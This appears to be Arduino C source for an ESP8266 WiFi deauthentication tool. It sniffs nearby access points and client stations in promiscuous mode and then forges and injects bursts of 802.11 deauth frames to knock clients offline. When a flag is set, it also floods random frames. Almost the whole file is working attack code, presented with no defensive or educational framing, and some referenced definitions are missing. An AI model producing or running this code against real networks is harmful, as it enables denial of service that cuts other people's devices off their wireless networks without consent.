#define ETH_MAC_LEN 6
#define MAX_APS_TRACKED 100
#define MAX_CLIENTS_TRACKED 200

// Put Your devices here, system will skip them on deauth

// Declare to whitelist STATIONs ONLY, otherwise STATIONs and APs can be whitelisted
// If AP is whitelisted, all its clients become automatically whitelisted
//#define WHITELIST_STATION

// Channel to perform deauth

// Packet buffer
uint8_t packet_buffer[64];

// DeAuth template
uint8_t template_da[26] = {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00};

uint8_t broadcast1[3] = { 0x01, 0x00, 0x5e };
uint8_t broadcast2[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
uint8_t broadcast3[3] = { 0x33, 0x33, 0x00 };


struct beaconinfo
{
    uint8_t bssid[ETH_MAC_LEN];
    uint8_t ssid[33];
    int ssid_len;
    int channel;
    int err;
    signed rssi;
    uint8_t capa[2];
};

struct clientinfo
{
    uint8_t bssid[ETH_MAC_LEN];
    uint8_t station[ETH_MAC_LEN];
    uint8_t ap[ETH_MAC_LEN];
    int channel;
    int err;
    signed rssi;
    uint16_t seq_n;
};

beaconinfo aps_known[MAX_APS_TRACKED];                    // Array to save MACs of known APs
int aps_known_count = 0;                                  // Number of known APs
int nothing_new = 0;
clientinfo clients_known[MAX_CLIENTS_TRACKED];            // Array to save MACs of known CLIENTs
int clients_known_count = 0;                              // Number of known CLIENTs

bool friendly_device_found = false;
uint8_t *address_to_check;
  
struct beaconinfo parse_beacon(uint8_t *frame, uint16_t framelen, signed rssi)
{
    struct beaconinfo bi;
    bi.ssid_len = 0;
    bi.channel = 0;
    bi.err = 0;
    bi.rssi = rssi;
    int pos = 36;

    if (frame[pos] == 0x00)
    {
        while (pos < framelen)
        {
            switch (frame[pos])
            {
            case 0x00: //SSID
                bi.ssid_len = (int) frame[pos + 1];
                if (bi.ssid_len == 0)
                {
                    memset(bi.ssid, '\x00', 33);
                    break;
                }
                if (bi.ssid_len < 0)
                {
                    bi.err = -1;
                    break;
                }
                if (bi.ssid_len > 32)
                {
                    bi.err = -2;
                    break;
                }
                memset(bi.ssid, '\x00', 33);
                memcpy(bi.ssid, frame + pos + 2, bi.ssid_len);
                bi.err = 0;  // before was error??
                break;
            case 0x03: //Channel
                bi.channel = (int) frame[pos + 2];
                pos = -1;
                break;
            default:
                break;
            }
            if (pos < 0) break;
            pos += (int) frame[pos + 1] + 2;
        }
    }
    else
    {
        bi.err = -3;
    }

    bi.capa[0] = frame[34];
    bi.capa[1] = frame[35];
    memcpy(bi.bssid, frame + 10, ETH_MAC_LEN);

    return bi;
}

struct clientinfo parse_data(uint8_t *frame, uint16_t framelen, signed rssi, unsigned channel)
{
    struct clientinfo ci;
    ci.channel = channel;
    ci.err = 0;
    ci.rssi = rssi;
    int pos = 36;
    uint8_t *bssid;
    uint8_t *station;
    uint8_t *ap;
    uint8_t ds;

    ds = frame[1] & 3;    //Set first 6 bits to 0
    switch (ds)
    {
    // p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
    case 0:
        bssid = frame + 16;
        station = frame + 10;
        ap = frame + 4;
        break;
    // p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
    case 1:
        bssid = frame + 4;
        station = frame + 10;
        ap = frame + 16;
        break;
    // p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
    case 2:
        bssid = frame + 10;
        // hack - don't know why it works like this...
        if (memcmp(frame + 4, broadcast1, 3) || memcmp(frame + 4, broadcast2, 3) || memcmp(frame + 4, broadcast3, 3))
        {
            station = frame + 16;
            ap = frame + 4;
        }
        else
        {
            station = frame + 4;
            ap = frame + 16;
        }
        break;
    // p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
    case 3:
        bssid = frame + 10;
        station = frame + 4;
        ap = frame + 4;
        break;
    }

    memcpy(ci.station, station, ETH_MAC_LEN);
    memcpy(ci.bssid, bssid, ETH_MAC_LEN);
    memcpy(ci.ap, ap, ETH_MAC_LEN);

    ci.seq_n = frame[23] * 0xFF + (frame[22] & 0xF0);

    return ci;
}

int register_beacon(beaconinfo beacon)
{
    int known = 0;   // Clear known flag
    for (int u = 0; u < aps_known_count; u++)
    {
        if (! memcmp(aps_known[u].bssid, beacon.bssid, ETH_MAC_LEN))
        {
            known = 1;
            break;
        }   // AP known => Set known flag
    }
    if (! known)  // AP is NEW, copy MAC to array and return it
    {
        memcpy(&aps_known[aps_known_count], &beacon, sizeof(beacon));
        aps_known_count++;

        if ((unsigned int) aps_known_count >=
                sizeof (aps_known) / sizeof (aps_known[0]) )
        {
            Serial.printf("exceeded max aps_known\n");
            aps_known_count = 0;
        }
    }
    return known;
}

int register_client(clientinfo ci)
{
    int known = 0;   // Clear known flag
    for (int u = 0; u < clients_known_count; u++)
    {
        if (! memcmp(clients_known[u].station, ci.station, ETH_MAC_LEN))
        {
            memcpy(&clients_known[u], &ci, sizeof(ci)); //UPDATE
            known = 1;
            break;
        }
    }
    if (! known)
    {
        memcpy(&clients_known[clients_known_count], &ci, sizeof(ci));
        clients_known_count++;

        if ((unsigned int) clients_known_count >=
                sizeof (clients_known) / sizeof (clients_known[0]) )
        {
            Serial.printf("exceeded max clients_known\n");
            clients_known_count = 0;
        }
    }
    return known;
}

void print_beacon(beaconinfo beacon)
{
    if (beacon.err != 0)
    {
        //Serial.printf("BEACON ERR: (%d)  ", beacon.err);
    }
    else
    {
      
        Serial.printf("[%32s] | ", beacon.ssid);
        for (int i = 0; i < 6; i++) Serial.printf("%02X", beacon.bssid[i]);
        Serial.printf(" | %2d", beacon.channel);
        Serial.printf(" | %4d |\r\n", beacon.rssi);
    }
}

void print_client(clientinfo ci)
{
    int u = 0;
    int known = 0;   // Clear known flag
    if (ci.err != 0)
    {
    }
    else
    {
        for (u = 0; u < aps_known_count; u++)
        {
            if (! memcmp(aps_known[u].bssid, ci.bssid, ETH_MAC_LEN))
            {
                Serial.printf("[%32s]", aps_known[u].ssid);
                known = 1;
                break;
            }   // AP known => Set known flag
        }

        if(!known)
        {
            Serial.printf("[%32s]", "Unknown");          
        }

        Serial.printf(" | ");

        for (int i = 0; i < 6; i++) Serial.printf("%02X", ci.station[i]);

        Serial.printf(" | ");
/*
        Serial.printf("%5s", " ");
        for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.ap[i]);
        Serial.printf("%5s", " ");
*/
        if (! known)
        {
            Serial.printf("%2d", ci.channel);
        }
        else
        {
            Serial.printf("%2d", aps_known[u].channel);
        }
        Serial.printf(" | ");
        
        Serial.printf("%4d", ci.rssi);

        Serial.printf(" | \r\n");
    }
}

/* ==============================================
   Promiscous callback structures, see ESP manual
   ============================================== */

struct RxControl
{
    signed rssi: 8;
    unsigned rate: 4;
    unsigned is_group: 1;
    unsigned: 1;
    unsigned sig_mode: 2;
    unsigned legacy_length: 12;
    unsigned damatch0: 1;
    unsigned damatch1: 1;
    unsigned bssidmatch0: 1;
    unsigned bssidmatch1: 1;
    unsigned MCS: 7;
    unsigned CWB: 1;
    unsigned HT_length: 16;
    unsigned Smoothing: 1;
    unsigned Not_Sounding: 1;
    unsigned: 1;
    unsigned Aggregation: 1;
    unsigned STBC: 2;
    unsigned FEC_CODING: 1;
    unsigned SGI: 1;
    unsigned rxend_state: 8;
    unsigned ampdu_cnt: 8;
    unsigned channel: 4;
    unsigned: 12;
};

struct LenSeq
{
    uint16_t length;
    uint16_t seq;
    uint8_t  address3[6];
};

struct sniffer_buf
{
    struct RxControl rx_ctrl;
    uint8_t buf[36];
    uint16_t cnt;
    struct LenSeq lenseq[1];
};

struct sniffer_buf2
{
    struct RxControl rx_ctrl;
    uint8_t buf[112];
    uint16_t cnt;
    uint16_t len;
};


/* Creates a packet.
   buf - reference to the data array to write packet to;
   client - MAC address of the client;
   ap - MAC address of the acces point;
   seq - sequence number of 802.11 packet;
   Returns: size of the packet
*/
uint16_t create_packet(uint8_t *buf, uint8_t *c, uint8_t *ap, uint16_t seq)
{
    int i = 0;

    memcpy(buf, template_da, 26);
    // Destination
    memcpy(buf + 4, c, ETH_MAC_LEN);
    // Sender
    memcpy(buf + 10, ap, ETH_MAC_LEN);
    // BSS
    memcpy(buf + 16, ap, ETH_MAC_LEN);
    // Seq_n
    buf[22] = seq % 0xFF;
    buf[23] = seq / 0xFF;

    buf[0] = random(255);

    return 26;
}

/* Sends deauth packets. */
void deauth(uint8_t *c, uint8_t *ap, uint16_t seq)
{
    uint16_t i = 0;
    uint16_t sz = 0;
    for (i = 0; i < 256; i++)
    {
        sz = create_packet(packet_buffer, c, ap, seq + 0x10 * i);
        wifi_send_pkt_freedom(packet_buffer, sz, 0);
        delay(1);
    }
}

void promisc_cb(uint8_t *buf, uint16_t len)
{
    int i = 0;
    uint16_t seq_n_new = 0;

    if(DIS == 1)
    {
        if(buf[len - 1] > 128)
        {
            digitalWrite(D0, LOW);
        }
        else
        {
            digitalWrite(D0, HIGH);            
        }
      
        uint8_t packet[250];
        for(int i=0;i<250;i++)
        {
            packet[i] = random(255);
        }
        wifi_send_pkt_freedom(packet, 250, 0);
    }

    if (len == 12)
    {
        struct RxControl *sniffer = (struct RxControl*) buf;
    }
    else if (len == 128)
    {
        struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
        struct beaconinfo beacon = parse_beacon(sniffer->buf, 112, sniffer->rx_ctrl.rssi);

        if (register_beacon(beacon) == 0)
        {
            //print_beacon(beacon);
            nothing_new = 0;
        }
    }
    else
    {    
        struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
        //Is data or QOS?
        if ((sniffer->buf[0] == 0x08) || (sniffer->buf[0] == 0x88))
        {
            struct clientinfo ci = parse_data(sniffer->buf, 36, sniffer->rx_ctrl.rssi, sniffer->rx_ctrl.channel);
            if (memcmp(ci.bssid, ci.station, ETH_MAC_LEN))
            {
                if (register_client(ci) == 0)
                {
                    //print_client(ci);
                    nothing_new = 0;
                }
            }
        }
    }
}

